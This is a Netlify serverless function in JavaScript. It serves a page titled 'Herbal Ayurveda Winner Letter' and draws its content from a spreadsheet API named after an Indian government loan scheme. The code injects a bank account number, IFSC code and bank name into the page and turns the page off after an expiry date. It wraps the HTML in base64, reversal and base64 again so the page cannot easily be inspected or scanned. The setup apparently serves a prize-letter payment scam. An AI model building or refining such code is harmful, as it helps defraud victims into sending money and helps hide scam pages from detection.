// netlify/functions/render.js
// Serves the obfuscated HTML page (equivalent of your PHP output)
// Node 18+ is assumed (global fetch). If your environment lacks fetch, uncomment the node-fetch fallback.

const EXPIRY_ID = "TRL";
const SHEETBASE_API = "https://sheetbase.co/api/pradhan_mantri_mudra_yojna/1s2x-KZ-dm0rRHGEoqNxbe06RBxQlkJXQdYIXn3La49U/sheet1/";
const DATETIME_API = "https://datetimeapi.vercel.app/api/datetime.js";

async function fetchJson(url) {
  // if global fetch not available in your runtime, uncomment this:
  // const fetch = globalThis.fetch || (await import('node-fetch')).default;
  const res = await fetch(url);
  if (!res.ok) throw new Error(`Fetch failed ${url} -> ${res.status}`);
  const text = await res.text();
  // the datetime API returns JS that looks like JSON; attempt to parse JSON in text
  try {
    return JSON.parse(text);
  } catch (e) {
    // fallback: if it's JS wrapped, try to extract JSON between first { and last }
    const first = text.indexOf('{'), last = text.lastIndexOf('}');
    if (first >= 0 && last > first) {
      return JSON.parse(text.slice(first, last + 1));
    }
    throw e;
  }
}

exports.handler = async function (event, context) {
  try {
    const tjson = await fetchJson(DATETIME_API);
    if (!tjson || !tjson.datetime) {
      return {
        statusCode: 500,
        headers: { 'content-type': 'text/html; charset=utf-8' },
        body: '<h2>Datetime error</h2>'
      };
    }
    const serverDatetime = tjson.datetime;

    const sheetResp = await fetch(SHEETBASE_API);
    if (!sheetResp.ok) throw new Error('Sheetbase fetch failed');
    const sheetText = await sheetResp.text();
    const data = JSON.parse(sheetText);

    let item = null;
    if (!data || !Array.isArray(data.data)) {
      return {
        statusCode: 500,
        headers: { 'content-type': 'text/html; charset=utf-8' },
        body: '<h2>Sheet data error</h2>'
      };
    }
    for (const entry of data.data) {
      if (entry.id === EXPIRY_ID) { item = entry; break; }
    }
    if (!item) {
      return {
        statusCode: 404,
        headers: { 'content-type': 'text/html; charset=utf-8' },
        body: '<h2>Entry missing</h2>'
      };
    }

    // expiry check
    if (new Date(serverDatetime) > new Date(item.date)) {
      return {
        statusCode: 403,
        headers: { 'content-type': 'text/html; charset=utf-8' },
        body: '<h2>This Page is expired.</h2>'
      };
    }

    // decode item html/css/js (they are base64 in your system)
    const decodedHTML = item.html ? Buffer.from(item.html, 'base64').toString('utf8') : '';
    // we'll link to /style.css and /init.js (these will be routed to functions)
    const fullPage = `
<link rel='stylesheet' href="/style.css">
<script>
window.SERVER_EXPIRY = ${JSON.stringify(item.date)};
window.SERVER_TIME   = ${JSON.stringify(serverDatetime)};
window.SERVER_ACC    = ${JSON.stringify(item.acc ?? '')};
window.SERVER_IFSC   = ${JSON.stringify(item.ifsc ?? '')};
window.SERVER_BANK   = ${JSON.stringify(item.bank ?? '')};
</script>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const s = document.createElement('script');
    s.src = '/init.js';
    s.onload = function() {
        if (typeof initializePage === 'function') initializePage();
    };
    document.head.appendChild(s);
});
</script>

${decodedHTML}
`;

    // Layering: base64 -> reverse -> base64 (same as your PHP)
    const layerA = Buffer.from(fullPage, 'utf8').toString('base64');
    const layerB = layerA.split('').reverse().join('');
    const layerC = Buffer.from(layerB, 'utf8').toString('base64');

    const page = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Herbal Ayurveda Winner Letter</title>
<script>
(function(){
    try {
        const payload = "${layerC}";
        const step1 = atob(payload);
        const step2 = step1.split('').reverse().join('');
        const finalHtml = atob(step2);
        document.open();
        document.write(finalHtml);
        document.close();
    } catch (e) {
        console.error('Decode error', e);
        document.open();
        document.write('<h2>Page load error</h2>');
        document.close();
    }
})();
</script>
</head>
<body></body>
</html>`;

    return {
      statusCode: 200,
      headers: { 'content-type': 'text/html; charset=utf-8' },
      body: page
    };

  } catch (err) {
    console.error(err);
    return {
      statusCode: 500,
      headers: { 'content-type': 'text/html; charset=utf-8' },
      body: `<h2>Server error</h2><pre>${String(err.message)}</pre>`
    };
  }
};
